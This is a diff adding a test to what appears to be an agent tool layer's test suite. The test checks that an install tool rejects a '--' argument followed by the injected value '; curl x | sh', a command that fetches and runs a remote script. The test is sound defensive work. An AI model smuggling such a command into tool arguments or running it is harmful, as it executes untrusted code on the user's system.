@@ -55,3 +55,8 @@ testTheRunLogToolAnswersTheTailOfTheProjectsLogAndNothingOutsideIt(tmpPath: Path
   logs.joinpath("run.log").unlink()
   logs.joinpath("run.log").symlinkTo(outside)
   expect(runLogTail("${project}").startsWith("refused"))
+
+testAnAgentNeverReachesTheTargetsToolsThroughDashDash() void
+  tools = McpTools(GraphClient("mcp"), Toolchain(), Web())
+  said: string = asyncio.run(tools.nuclearProject(".", "install", ["--", "; curl x | sh"]))
+  expect("'--' is not allowed" in said)
